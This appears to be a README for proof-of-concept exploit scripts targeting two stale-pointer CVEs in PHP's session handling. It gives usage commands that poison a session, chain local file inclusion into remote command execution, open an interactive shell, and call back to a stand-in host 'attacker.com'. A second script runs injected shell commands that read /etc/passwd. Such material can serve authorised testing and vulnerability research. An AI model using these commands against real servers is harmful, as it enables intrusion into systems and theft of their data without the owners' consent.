CVE-2026-109618 — post_bytes_processed stale pointer (session.c:3292)

CVE-2026-109619 — current_file_bytes_processed stale pointer (session.c:3318)

Usage
```
python3 poc.py <url> <command> [OPTIONS]

# Session poison + auto-detected LFI
python3 poc.py http://target.example.com/index.php "id"

# Specify LFI parameter
python3 poc.py http://target.example.com/ "id" --lfi-param page

# Interactive shell
python3 poc.py http://target.example.com/ "id" -i

# Blind callback (no LFI needed on target side)
python3 poc.py http://target.example.com/ "id" --callback http://attacker.com/
```
Usage for phppoc2

```
python3 exploit.py --port 18110

#Run a custom command:
# Write a script to the mounted out/ dir
printf 'id; uname -a; whoami; cat /etc/passwd > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
cat out/p1

#Re-run with fresh ASLR (new container):
python3 exploit.py --port 18110 --restart p2s-pure-18110
```

Writeup coming soon. Credit to Syrex1013
For phpshell2, credit to 9bie
